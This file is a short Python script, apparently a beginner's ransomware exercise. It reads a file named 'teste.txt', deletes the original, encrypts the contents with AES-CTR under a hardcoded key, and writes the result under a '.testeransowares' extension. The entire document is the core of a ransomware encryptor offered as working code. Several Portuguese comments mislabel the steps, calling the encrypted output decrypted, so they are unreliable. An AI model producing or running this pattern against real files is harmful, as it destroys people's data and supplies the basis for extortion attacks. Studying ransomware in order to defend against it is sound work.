import os
import pyaes

# abrir o arquivo descriptografado
file_name = "teste.txt"
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# remover o arquivo criptografafo
os.remove(file_name)

# chave de criptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# criar um arquivo descriptografado
new_file = file_name + ".testeransowares"
new_file = open(new_file, 'wb')
new_file.write(crypto_data)
new_file.close()

